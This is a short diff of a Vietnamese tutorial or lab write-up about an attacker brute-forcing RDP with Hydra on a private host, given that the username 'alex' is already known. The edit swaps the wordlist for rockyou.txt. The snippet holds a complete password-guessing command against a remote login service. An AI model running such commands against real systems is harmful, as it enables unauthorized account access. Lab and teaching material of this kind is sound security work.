@@ -11,7 +11,7 @@ Attacker sử dụng hydra brute force dịch vụ RDP trên 1 host dưới đâ
 **Trong đây giả sử attacker đã thu được username**
 
 ```bash
-sudo hydra -t 1 -V -f -l alex -P '/home/kuga/Desktop/common_pass.txt' rdp://192.168.188.40:3389  
+sudo hydra -V -f -l alex -P '/home/kuga/rockyou.txt' rdp://192.168.188.40:3389 
 ```
 
 Sau khi thực hiện xong lệnh trên Hydra sẽ bắt đầu thử từng mật khẩu cho đến khi kiếm được password khớp với password của user alex.
